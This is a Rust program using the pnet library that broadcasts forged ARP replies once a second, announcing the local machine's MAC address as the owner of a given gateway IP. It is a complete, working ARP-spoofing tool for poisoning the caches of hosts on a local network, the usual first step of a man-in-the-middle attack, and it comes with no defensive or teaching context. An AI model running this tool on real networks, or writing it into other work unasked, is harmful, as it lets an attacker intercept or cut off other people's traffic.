extern crate pnet;

use pnet::datalink::{self, NetworkInterface};
use pnet::datalink::Channel::Ethernet;
use pnet::packet::{Packet, MutablePacket};
use pnet::packet::ethernet::{MutableEthernetPacket, EtherTypes};
use pnet::packet::arp::{MutableArpPacket, ArpHardwareTypes, ArpOperations};
use pnet::util::MacAddr;
use std::env;
use std::net::Ipv4Addr;
use std::thread;
use std::time;

fn print_usage(program: &str) {
    println!("Usage: {} <interface> <gateway ip>", program);
}

fn main() {
    let args: Vec<String> = env::args().collect();
    let program = &args[0];
    if args.len() != 3 {
        print_usage(program);
        return;
    }

    let iface_name = args[1].clone();
    let gateway_ip = args[2].clone();

    let filter = |iface: &NetworkInterface| {
        !iface.is_loopback() && iface.name == iface_name
    };
    let ifaces = datalink::interfaces();
    let iface = match ifaces.into_iter().filter(filter).next() {
        Some(iface) => iface,
        None => panic!("{}: unable to find interface '{}'", program, iface_name),
    };

    let gateway = match gateway_ip.parse::<Ipv4Addr>() {
        Ok(ip) => ip,
        Err(_) => panic!("{}: invalid ip address'{}'", program, gateway_ip),
    };

    let mut buf = [0u8; 42];
    let packet = build_packet(&iface.mac_address(), &gateway, &mut buf[..]);

    let (mut tx, _) = match datalink::channel(&iface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("{}: unhandled chanel type", program),
        Err(e) => panic!("{}: unable to create channel: {}", program, e),
    };

    loop {
        tx.build_and_send(3, packet.packet().len(),
            &mut |mut new_packet| {
                new_packet.clone_from(&packet);
            });

        thread::sleep(time::Duration::from_millis(1000));
    }
}

fn build_packet<'a>(mac: &MacAddr, ip: &Ipv4Addr, buf: &'a mut [u8]) -> MutableEthernetPacket<'a> {
    let mut arp_buf = [0u8; 28];
    let arp_packet = build_arp_packet(mac, ip, &mut arp_buf[..]);
    let mut packet = MutableEthernetPacket::new(buf).unwrap();
    packet.set_destination(MacAddr::new(0xff, 0xff, 0xff, 0xff, 0xff, 0xff));
    packet.set_source(*mac);
    packet.set_ethertype(EtherTypes::Arp);
    packet.set_payload(arp_packet.packet());

    packet
}

fn build_arp_packet<'a>(mac: &MacAddr, ip: &Ipv4Addr, buf: &'a mut [u8] ) -> MutableArpPacket<'a> {
    let mut packet = MutableArpPacket::new(buf).unwrap();
    packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    packet.set_protocol_type(EtherTypes::Ipv4);
    packet.set_hw_addr_len(6);
    packet.set_proto_addr_len(4);
    packet.set_operation(ArpOperations::Reply);
    packet.set_sender_hw_addr(*mac);
    packet.set_sender_proto_addr(*ip);
    packet.set_target_hw_addr(MacAddr::new(0xff, 0xff, 0xff, 0xff, 0xff, 0xff));
    packet.set_target_proto_addr(Ipv4Addr::new(255, 255, 255, 255));

    packet
}
